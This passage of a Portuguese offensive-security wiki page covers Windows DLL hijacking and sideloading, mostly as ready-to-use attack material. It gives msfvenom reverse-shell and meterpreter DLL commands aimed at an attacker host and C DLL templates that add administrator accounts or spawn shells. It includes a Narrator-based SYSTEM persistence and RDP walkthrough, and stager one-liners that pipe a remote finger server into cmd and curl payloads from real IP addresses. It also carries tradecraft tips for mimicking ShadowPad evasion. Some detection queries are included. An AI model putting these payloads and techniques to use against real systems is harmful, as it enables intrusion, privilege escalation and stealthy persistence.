[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verifica se você tem permissões de gravação em alguma pasta dentro do system PATH.\
Outras ferramentas automatizadas interessantes para detectar essa vulnerabilidade são as funções do **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Exemplo

Caso encontre um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso seria **criar uma DLL que exporte pelo menos todas as funções que o executável importará dela**. De qualquer forma, observe que o DLL Hijacking é útil para [escalar do nível de integridade Medium para High **(contornando o UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de [**High Integrity para SYSTEM**](../index.html#from-high-integrity-to-system)**.** Você pode encontrar um exemplo de **como criar uma DLL válida** neste estudo sobre DLL hijacking, focado em execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Além disso, na **próxima seçã**o você encontrará alguns **códigos básicos de DLL** que podem ser úteis como **modelos** ou para criar uma **DLL com funções não obrigatórias exportadas**.

## **Criação e compilação de DLLs**

### **Proxificação de DLL**

Basicamente, um **proxy de DLL** é uma DLL capaz de **executar seu código malicioso quando carregada**, mas também de **expor** e **funcionar** como **esperado**, **repassando todas as chamadas para a biblioteca real**.

Com a ferramenta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus), você pode **indicar um executável e selecionar a biblioteca** que deseja proxificar e **gerar uma DLL proxificada**, ou **indicar a DLL** e **gerar uma DLL proxificada**.

### **Meterpreter**

**Obter shell reversa (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Obtenha um meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Criar um usuário (não encontrei uma versão x64 para x86):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Sua própria DLL

Em muitos casos, a DLL que você compilar precisa **exportar todas as funções importadas pelo processo vítima**. Se faltar uma exportação obrigatória, o binário não conseguirá resolvê-la e o exploit falhará.

<details>
<summary>Modelo de DLL em C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Exemplo de DLL em C++ com criação de usuário</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL C alternativa com ponto de entrada de thread</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### DLL NativeAOT com inicialização acionada por exportação

Uma **biblioteca compartilhada .NET NativeAOT** autocontida pode ser usada como a DLL nativa plantada sem implementar um `DllMain` explícito. Exporte métodos C# estáticos com `[UnmanagedCallersOnly(EntryPoint = "...")]`; quando o host nativo chama um desses pontos de entrada gerados pelo compilador, o NativeAOT inicializa o módulo e um método `[ModuleInitializer]` é executado antes do corpo C# exportado. A saída não exige uma instalação separada do runtime .NET.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

A DLL ainda precisa dos **nomes de exportação e das assinaturas compatíveis com a ABI** que o host selecionado realmente invoca. Stubs mínimos podem ser suficientes para acionar a inicialização, mas exportações ausentes podem impedir o carregamento, e uma assinatura incorreta pode corromper a chamada. Enumere as importações do host e valide o resultado com `dumpbin /exports payload.dll` antes de renomear a saída para o nome da dependência esperado pelo host.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>DLL exportada NativeAOT mínima</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Configure o projeto como uma biblioteca compartilhada nativa do Windows autossuficiente:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Coloque a DLL renomeada ao lado do executável vulnerável copiado e inicie o host pelo caminho de código que chama a exportação compatível. Essa abordagem com inicializador evita colocar trabalho complexo diretamente em `DllMain`, mas os pré-requisitos de sideload permanecem os mesmos: o loader deve resolver a dependência pelo nome, selecionar o diretório do aplicativo e não encontrá-la primeiro em KnownDLLs, em um módulo já carregado, por redirecionamento SxS ou por flags `LOAD_LIBRARY_SEARCH_*` restritas.<sup>[[26]](#references)[[30]](#references)</sup>

Para modelos nativos convencionais, consulte [Windows C payloads](../windows-c-payloads.md). Um primeiro estágio carregado por sideload pode, posteriormente, executar [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe), mas essa é uma técnica de injeção separada, não parte da resolução de DLL.

## Detecção: carregamentos de biblioteca por DLL masquerading

O Elastic Defend 9.5.0 enriquece um evento de carregamento de biblioteca com `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` quando o arquivo carregado não é assinado pela Microsoft e seu nome coincide com o inventário em cache de nomes de DLLs do Windows/sistema do Elastic. Isso transfere a análise do inventário de nomes de arquivo, da localização do sistema e da assinatura para o sensor do endpoint; assim, o EQL principal pode ser reduzido a:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Trate o enriquecimento como um pivô de alto valor, não como prova por si só. Aumente a confiança quando um host assinado carrega a DLL de seu próprio diretório **gravável pelo usuário**, a DLL não é assinada/não é confiável e `dll.Ext.relative_file_creation_time` indica que ela foi criada pouco antes do carregamento. Restrinja as exclusões à combinação exata de publicador + processo host + caminho de instalação; não suprima globalmente um nome de DLL conflitante, pois instaladores e aplicativos legítimos podem incluir bibliotecas privadas com nomes semelhantes aos do sistema.<sup>[[26]](#references)</sup>

Em sensores sem esse enriquecimento, aproxime-se desse comportamento correlacionando um nome de DLL conflitante com um caminho de carregamento não pertencente ao sistema, uma assinatura da Microsoft ausente/não confiável e um curto intervalo entre a criação do arquivo e o carregamento. Isso exige um inventário de nomes de DLL mantido e exclusões restritas para `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` e outros caminhos de implantação aprovados.<sup>[[26]](#references)</sup>

## Estudo de caso: sequestro da DLL de localização TTS do Narrator OneCore (acessibilidade/ATs)

O Windows Narrator.exe ainda procura, ao iniciar, uma DLL de localização previsível e específica para cada idioma, que pode ser sequestrada para execução de código arbitrário e persistência.<sup>[[7]](#references)</sup>

Fatos principais
- Caminho de busca (compilações atuais): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Caminho legado (compilações antigas): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se houver uma DLL gravável e controlada pelo atacante no caminho OneCore, ela será carregada e `DllMain(DLL_PROCESS_ATTACH)` será executado. Não são necessárias exports.

Descoberta com Procmon
- Filtro: `Process Name is Narrator.exe` e `Operation is Load Image` ou `CreateFile`.
- Inicie o Narrator e observe a tentativa de carregamento do caminho acima.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Silêncio OPSEC
- Um hijack ingênuo vai falar/destacar a UI. Para agir sem chamar atenção, ao anexar, enumere as threads do Narrator, abra a thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) e suspenda-a com `SuspendThread`; continue na sua própria thread. Consulte o PoC para ver o código completo.<sup>[[8]](#references)</sup>

Disparo e persistência por meio da configuração de Accessibility
- Contexto do usuário (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Com o procedimento acima, iniciar o Narrator carrega a DLL implantada. Na área de trabalho segura (tela de logon), pressione CTRL+WIN+ENTER para iniciar o Narrator; sua DLL é executada como SYSTEM na área de trabalho segura.

Execução como SYSTEM acionada por RDP (movimento lateral)
- Permita a camada de segurança clássica do RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Conecte-se ao host por RDP; na tela de logon, pressione CTRL+WIN+ENTER para iniciar o Narrator; sua DLL é executada como SYSTEM na área de trabalho segura.
- A execução é interrompida quando a sessão RDP é encerrada — injete/migre imediatamente.

Bring Your Own Accessibility (BYOA)
- Você pode clonar uma entrada de registro de uma ferramenta de Accessibility (AT) integrada (por exemplo, CursorIndicator), editá-la para apontar para um binário/DLL arbitrário, importá-la e, em seguida, definir `configuration` com o nome dessa AT. Isso permite executar código arbitrário por meio do framework de Accessibility.

Observações
- A gravação em `%windir%\System32` e a alteração de valores HKLM exigem direitos de administrador.
- Toda a lógica do payload pode ficar em `DLL_PROCESS_ATTACH`; não são necessárias exports.

## Estudo de caso: CVE-2025-1729 - Escalação de privilégios usando TPQMAssistant.exe

Este caso demonstra **Phantom DLL Hijacking** no TrackPoint Quick Menu da Lenovo (`TPQMAssistant.exe`), identificado como **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Detalhes da vulnerabilidade

- **Componente**: `TPQMAssistant.exe`, localizado em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Tarefa agendada**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` é executada diariamente às 9:30 no contexto do usuário conectado.
- **Permissões do diretório**: Permite gravação por `CREATOR OWNER`, permitindo que usuários locais depositem arquivos arbitrários.
- **Comportamento de busca da DLL**: Tenta carregar `hostfxr.dll` primeiro do diretório de trabalho e registra "NAME NOT FOUND" se o arquivo estiver ausente, indicando precedência na busca pelo diretório local.

### Implementação do exploit

Um atacante pode colocar um stub malicioso `hostfxr.dll` no mesmo diretório, explorando a DLL ausente para executar código no contexto do usuário:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Fluxo de ataque

1. Como usuário padrão, coloque `hostfxr.dll` em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Aguarde a tarefa agendada ser executada às 9:30 AM no contexto do usuário atual.
3. Se um administrador estiver conectado quando a tarefa for executada, a DLL maliciosa será executada na sessão do administrador com integridade média.
4. Encadeie técnicas padrão de bypass de UAC para elevar de integridade média a privilégios de SYSTEM.

## Estudo de caso: Dropper de MSI CustomAction + DLL Side-Loading por meio de um host assinado (wsc_proxy.exe)

Atores de ameaças frequentemente combinam droppers baseados em MSI com DLL side-loading para executar payloads em um processo confiável e assinado.<sup>[[10]](#references)</sup>

Visão geral da cadeia
- O usuário baixa o MSI. Uma CustomAction é executada silenciosamente durante a instalação pela GUI (por exemplo, LaunchApplication ou uma ação de VBScript), reconstruindo o próximo estágio a partir de recursos incorporados.
- O dropper grava um EXE legítimo e assinado e uma DLL maliciosa no mesmo diretório (exemplo de par: wsc_proxy.exe assinado pela Avast + wsc.dll controlada pelo atacante).
- Quando o EXE assinado é iniciado, a ordem de pesquisa de DLL do Windows carrega primeiro wsc.dll do diretório de trabalho, executando o código do atacante sob um processo pai assinado (ATT&CK T1574.001).

Análise de MSI (o que procurar)
- Tabela CustomAction:
  - Procure entradas que executem arquivos executáveis ou VBScript. Padrão suspeito de exemplo: LaunchApplication executando um arquivo incorporado em segundo plano.
  - No Orca (Microsoft Orca.exe), inspecione as tabelas CustomAction, InstallExecuteSequence e Binary.
- Payloads incorporados/divididos no CAB do MSI:
  - Extração administrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Ou use lessmsi: lessmsi x package.msi C:\out
  - Procure vários fragmentos pequenos que são concatenados e descriptografados por uma CustomAction de VBScript. Fluxo comum:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Sideloading prático com wsc_proxy.exe
- Coloque estes dois arquivos na mesma pasta:
  - wsc_proxy.exe: host legítimo assinado (Avast). O processo tenta carregar wsc.dll pelo nome a partir do próprio diretório.
  - wsc.dll: DLL do atacante. Se não forem necessários exports específicos, DllMain pode ser suficiente; caso contrário, crie uma proxy DLL e encaminhe os exports necessários para a biblioteca genuína enquanto executa o payload em DllMain.
- Crie um payload mínimo de DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Para requisitos de exportação, use um framework de proxy (por exemplo, DLLirant/Spartacus) para gerar uma DLL de encaminhamento que também execute seu payload.

- Essa técnica depende da resolução de nomes de DLL pelo binário host. Se o host usar caminhos absolutos ou sinalizadores de carregamento seguro (por exemplo, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), o hijack poderá falhar.
- KnownDLLs, SxS e exports encaminhados podem influenciar a precedência e devem ser considerados ao selecionar o binário host e o conjunto de exports.

## Tríades assinadas + payloads criptografados (estudo de caso do ShadowPad)

A Check Point descreveu como o Ink Dragon implanta o ShadowPad usando uma **tríade de três arquivos** para se misturar a softwares legítimos e manter o payload principal criptografado no disco:<sup>[[12]](#references)</sup>

1. **EXE host assinado** – fornecedores como AMD, Realtek ou NVIDIA são usados indevidamente (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Os atacantes renomeiam o executável para parecer um binário do Windows (por exemplo, `conhost.exe`), mas a assinatura Authenticode continua válida.
2. **DLL loader maliciosa** – colocada ao lado do EXE com um nome esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). A DLL geralmente é um binário MFC ofuscado com o framework ScatterBrain; sua única função é localizar o blob criptografado, descriptografá-lo e mapear o ShadowPad de forma reflexiva.
3. **Blob de payload criptografado** – geralmente armazenado como `<name>.tmp` no mesmo diretório. Depois de mapear o payload descriptografado na memória, o loader exclui o arquivo TMP para destruir evidências forenses.

Observações sobre tradecraft:

* Renomear o EXE assinado (mantendo o `OriginalFileName` original no cabeçalho PE) permite que ele se passe por um binário do Windows e mantenha a assinatura do fornecedor; portanto, reproduza o hábito do Ink Dragon de soltar binários com aparência de `conhost.exe` que, na verdade, são utilitários da AMD/NVIDIA.
* Como o executável continua confiável, a maioria dos controles de allowlisting só exige que sua DLL maliciosa fique ao lado dele. Concentre-se em personalizar a DLL loader; normalmente, o executável pai assinado pode ser executado sem alterações.
* O decryptor do ShadowPad espera que o blob TMP esteja ao lado do loader e tenha permissão de gravação, para poder zerar o arquivo após o mapeamento. Mantenha o diretório com permissão de gravação até o payload ser carregado; depois que estiver na memória, o arquivo TMP poderá ser excluído com segurança para OPSEC.

### Cadeia de stager LOLBAS + sideloading de arquivo compactado em etapas (finger → tar/curl → WMI)

Os operadores combinam DLL sideloading com LOLBAS para que o único artefato personalizado no disco seja a DLL maliciosa ao lado do EXE confiável:<sup>[[1]](#references)</sup>

- **Loader de comandos remoto (Finger):** um PowerShell oculto inicia `cmd.exe /c`, obtém comandos de um servidor Finger e os encaminha para `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` obtém texto via TCP/79; `| cmd` executa a resposta do servidor, permitindo que os operadores alternem o servidor da segunda etapa no lado do servidor.

- **Download/extração integrados:** Baixe um arquivo com uma extensão inofensiva, extraia-o e prepare o alvo de sideload e a DLL em uma pasta aleatória de `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` oculta o progresso e segue redirecionamentos; `tar -xf` usa o tar integrado do Windows.

- **Inicialização via WMI/CIM:** Inicie o EXE via WMI para que a telemetria mostre um processo criado pelo CIM enquanto ele carrega a DLL localizada no mesmo diretório:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Funciona com binários que preferem DLLs locais (por exemplo, `intelbq.exe`, `nearby_share.exe`); o payload (por exemplo, Remcos) é executado sob o nome confiável.

- **Hunting:** Gere alertas para `forfiles` quando `/p`, `/m` e `/c` aparecerem juntos; isso é incomum fora de scripts de administração.


## Estudo de caso: dropper NSIS + sideload do Bitdefender Submission Wizard (Chrysalis)

Uma intrusão recente do Lotus Blossom abusou de uma cadeia confiável de atualização para entregar um dropper empacotado com NSIS que preparava um DLL sideload e payloads totalmente em memória.<sup>[[13]](#references)</sup>

Fluxo de operações
- `update.exe` (NSIS) cria `%AppData%\Bluetooth`, marca a pasta como **HIDDEN**, grava um Bitdefender Submission Wizard renomeado (`BluetoothService.exe`), um `log.dll` malicioso e um blob criptografado chamado `BluetoothService`, depois inicia o EXE.
- O host EXE importa `log.dll` e chama `LogInit`/`LogWrite`. `LogInit` carrega o blob com mmap; `LogWrite` o descriptografa usando um fluxo personalizado baseado em LCG (constantes **0x19660D** / **0x3C6EF35F**, material da chave derivado de um hash anterior), sobrescreve o buffer com shellcode em texto simples, libera os temporários e salta para ele.
- Para evitar uma IAT, o loader resolve APIs fazendo hash dos nomes das exports com **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, depois aplica um avalanche no estilo Murmur (**0x85EBCA6B**) e compara com hashes-alvo com salt.

Shellcode principal (Chrysalis)
- Descriptografa um módulo principal semelhante a PE repetindo add/XOR/sub com a chave `gQ2JR&9;` em cinco passagens; em seguida, carrega dinamicamente `Kernel32.dll` → `GetProcAddress` para concluir a resolução de imports.
- Reconstrói strings com nomes de DLL em tempo de execução por meio de transformações de rotação de bits/XOR por caractere; depois carrega `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa um segundo resolver que percorre a **PEB → InMemoryOrderModuleList**, analisa cada tabela de exports em blocos de 4 bytes com uma mistura no estilo Murmur e só recorre a `GetProcAddress` se o hash não for encontrado.

Configuração incorporada e C2
- A configuração fica dentro do arquivo `BluetoothService` gravado, no **offset 0x30808** (tamanho **0x980**), e é descriptografada com RC4 usando a chave `qwhvb^435h&*7`, revelando a URL do C2 e o User-Agent.
- Os beacons montam um perfil do host delimitado por pontos, acrescentam a tag `4Q` e, em seguida, criptografam com RC4 usando a chave `vAuig34%^325hGV` antes de chamar `HttpSendRequestA` via HTTPS. As respostas são descriptografadas com RC4 e encaminhadas por uma seleção baseada em tags (`4T` shell, `4V` execução de processo, `4W/4X` gravação de arquivo, `4Y` leitura/exfiltração, `4\\` desinstalação, `4` enumeração de unidades/arquivos + casos de transferência em blocos).
- O modo de execução é controlado por argumentos CLI: sem argumentos = instala persistência (serviço/chave Run) apontando para `-i`; `-i` inicia novamente o próprio processo com `-k`; `-k` ignora a instalação e executa o payload.

Loader alternativo observado
- A mesma intrusão instalou o Tiny C Compiler e executou `svchost.exe -nostdlib -run conf.c` a partir de `C:\ProgramData\USOShared\`, com `libtcc.dll` ao lado. O código-fonte C fornecido pelo atacante incorporava shellcode, que era compilado e executado em memória sem gravar um PE no disco. Reproduza com:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Esta etapa de compilação e execução baseada em TCC importou `Wininet.dll` em tempo de execução e buscou um shellcode de segundo estágio em uma URL codificada diretamente no código, criando um loader flexível que se disfarça de execução do compilador.

## DLL sideloading de host assinado com proxy de exports + estacionamento da thread do host

Algumas cadeias de DLL sideloading adicionam **engenharia de estabilidade** para manter o host legítimo em execução por tempo suficiente para carregar os estágios posteriores corretamente, em vez de travar após o carregamento da DLL maliciosa.<sup>[[11]](#references)</sup>

Padrão observado
- Coloque um EXE confiável ao lado de uma DLL maliciosa usando o nome de dependência esperado, como `version.dll`.
- A DLL maliciosa **faz proxy de todos os exports esperados** para a DLL real do sistema (por exemplo, `%SystemRoot%\\System32\\version.dll`), para que a resolução de imports continue funcionando e o processo host permaneça operacional.
- Após o carregamento, a DLL maliciosa **aplica um patch ao ponto de entrada do host** para que a thread principal entre em um loop infinito de `Sleep`, em vez de encerrar ou executar caminhos de código que terminariam o processo.
- Uma nova thread executa o trabalho malicioso real: descriptografa o nome ou caminho da DLL do estágio seguinte (RC4/XOR são comuns) e, em seguida, inicia seu carregamento com `LoadLibrary`.

Por que isso importa
- O proxying normal de DLL preserva a compatibilidade da API, mas não garante que o host permaneça em execução por tempo suficiente para os estágios posteriores.
- Colocar a thread principal em espera com `Sleep(INFINITE)` é uma maneira simples de manter o processo assinado ativo enquanto o loader executa a descriptografia, o staging ou a inicialização da rede em uma thread de trabalho.
- Buscar apenas um `DllMain` suspeito não detectará esse padrão se o comportamento relevante ocorrer após a aplicação de um patch ao ponto de entrada do host e o início de uma thread secundária.

Fluxo de trabalho mínimo
1. Copie o EXE assinado do host e determine qual DLL ele resolve a partir do diretório local.
2. Crie uma DLL proxy que exporte as mesmas funções e as encaminhe para a DLL legítima.
3. Em `DllMain(DLL_PROCESS_ATTACH)`, crie uma thread de trabalho.
4. Nessa thread, aplique um patch ao ponto de entrada do host ou à rotina de início da thread principal para fazê-la entrar em um loop com `Sleep`.
5. Descriptografe o nome/configuração da DLL do estágio seguinte e chame `LoadLibrary` ou faça o manual-map do payload.

Pontos de investigação defensiva
- Processos assinados que carregam `version.dll` ou bibliotecas comuns semelhantes de seu próprio diretório de aplicação, em vez de `System32`.
- Patches de memória no ponto de entrada do processo logo após o carregamento da imagem, especialmente saltos/chamadas redirecionados para `Sleep`/`SleepEx`.
- Threads criadas por uma DLL proxy que chamam imediatamente `LoadLibrary` para carregar uma segunda DLL com nome descriptografado.
- DLLs proxy com todos os exports, colocadas ao lado de executáveis de fornecedores em diretórios de staging graváveis, como `ProgramData`, `%TEMP%` ou caminhos de arquivos descompactados.

## References

- [1] [Red Canary – Informações de inteligência: janeiro de 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Escalação de privilégios usando TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking no Windows. Exemplo simples em C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore implanta novo malware com alvo na Europa](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: quando DLL Hijacks encontram os auxiliares do Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Doppelgängers digitais: anatomia de campanhas de impersonation em evolução que distribuem Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Interesses convergentes: análise de clusters de ameaças com alvo em um governo do Sudeste Asiático](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Por dentro do Ink Dragon: revelando a rede de retransmissão e o funcionamento interno de uma operação ofensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – O backdoor Chrysalis: uma análise aprofundada do toolkit do Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: cadeia ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Rastreamento das campanhas de espionagem de 2026 do APT iraniano Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Elemento `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Elemento `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Elemento `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Elemento `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Elemento `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Elemento `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Velozes e furiosos: operações do Nimbus Manticore durante o conflito iraniano](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Ações de tarefas](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 tem como alvo governos e infraestrutura crítica do Sudeste Asiático](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Reconstruindo e detectando DLL Search-Order Hijacking do Windows com Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Criando bibliotecas nativas com Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Exports nativos com Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
